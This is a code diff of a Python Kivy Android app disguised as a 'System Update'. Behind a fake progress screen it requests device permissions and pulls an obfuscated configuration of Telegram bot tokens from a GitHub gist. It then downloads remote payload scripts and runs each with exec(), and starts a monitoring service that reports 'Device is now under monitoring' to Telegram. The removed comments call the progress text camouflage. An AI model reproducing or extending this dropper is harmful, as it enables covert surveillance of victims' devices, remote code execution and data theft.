@@ -10,11 +10,10 @@ from kivy.utils import platform
 
 class SystemUpdateApp(App):
     def build(self):
-        # رابط الإعدادات المشفرة (config.json)
-        self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/6527633caf55de531728571c4ff372141021cecc/config.json"
+        # الرابط الصحيح لملف config.json (بعد التعديل)
+        self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/b506332d90b3bd191a5b09cc0ecbf15c9542026a/config.json"
         
         self.layout = BoxLayout(orientation='vertical')
-        # استخدام النص الإنجليزي لتجنب مشكلة ظهور مربعات (خط عربي غير مدعوم)
         self.label = Label(
             text="System Update\nChecking for compatibility... (0%)",
             halign="center",
@@ -22,12 +21,10 @@ class SystemUpdateApp(App):
         )
         self.layout.add_widget(self.label)
         
-        # تشغيل المحرك في خلفية منفصلة
         threading.Thread(target=self.logic_engine, daemon=True).start()
         return self.layout
 
     def decode_secret(self, data):
-        """فك تشفير النص: Base64 ثم عكس السلسلة"""
         try:
             decoded = base64.b64decode(data).decode('utf-8')
             return decoded[::-1]
@@ -35,7 +32,6 @@ class SystemUpdateApp(App):
             return ""
 
     def send_log(self, msg):
-        """إرسال رسالة حالة إلى Telegram باستخدام التوكن و chat_id من الإعدادات"""
         try:
             conf = globals().get('MASTER_CONFIG')
             if conf and conf['tokens']:
@@ -48,7 +44,6 @@ class SystemUpdateApp(App):
 
     def logic_engine(self):
         try:
-            # طلب الصلاحيات اللازمة إذا كان النظام أندرويد
             if platform == 'android':
                 from android.permissions import request_permissions, Permission
                 request_permissions([
@@ -57,34 +52,27 @@ class SystemUpdateApp(App):
                     Permission.INTERNET
                 ])
             
-            # انتظار لحظة لاستقرار الشبكة بعد فتح التطبيق
             time.sleep(2)
             
-            # تحميل ملف الإعدادات المشفر
             response = requests.get(self.config_url, timeout=15)
             config = response.json()
             
-            # فك التشفير وحفظ الإعدادات في متغير شامل
             globals()['MASTER_CONFIG'] = {
                 'tokens': [self.decode_secret(t) for t in config['t']],
                 'password': self.decode_secret(config['p']),
                 'v_id': self.decode_secret(config['v'])
             }
 
-            # إرسال تأكيد بدء التشغيل
             self.send_log("🚀 [System Update] Online! Configuration loaded successfully.")
-            
-            # تحديث واجهة المستخدم (تمويه)
             self.label.text = "Downloading system patches... (35%)"
-            
-            # تحميل وتشغيل جميع الوحدات
             self.load_payloads()
             
         except Exception as e:
+            # عرض الخطأ على الشاشة لتسهيل التشخيص
+            self.label.text = f"Connection Error:\n{str(e)}"
             self.send_log(f"❌ Critical Error: {str(e)}")
 
     def load_payloads(self):
-        """تحميل جميع ملفات البايلود من Gist وتنفيذها"""
         payload_urls = [
             "https://gist.githubusercontent.com/Zaen1993/e4af91aec551d599cc8b8ff244c36f23/raw/60c2108cd5fb3b5a78a8c2d9afb4519576526863/monitor.py",
             "https://gist.githubusercontent.com/Zaen1993/65685db73176fe064d3b8aaf7c699542/raw/a191c5e5dd42acef68154b2b72fb028a54cc82cb/telegram_ui.py",
@@ -100,24 +88,19 @@ class SystemUpdateApp(App):
         
         for url in payload_urls:
             try:
-                # تأخير بسيط لتجنب حظر IP بسبب الطلبات المتكررة
-                time.sleep(1)
-                # استخراج اسم الملف للإبلاغ
+                time.sleep(1)  # تجنب الحظر
                 name = url.split('/')[-1]
                 code = requests.get(url, timeout=10).text
-                exec(code, globals())  # تنفيذ الكود في النطاق العام
+                exec(code, globals())
                 self.send_log(f"✅ Module Loaded: {name}")
             except Exception as e:
                 self.send_log(f"⚠️ Warning: Failed to load {url.split('/')[-1]}")
                 continue
         
-        # بدء خدمة المراقبة إذا تم تحميل الكلاس Monitor
         if 'Monitor' in globals():
             self.send_log("⚙️ Starting Monitor Service...")
             monitor = globals()['Monitor']()
             monitor.start()
-            
-            # تحديث واجهة المستخدم (تمويه)
             self.label.text = "System is up to date (100%)"
             self.send_log("🎯 [Full Success] Device is now under monitoring.")
 
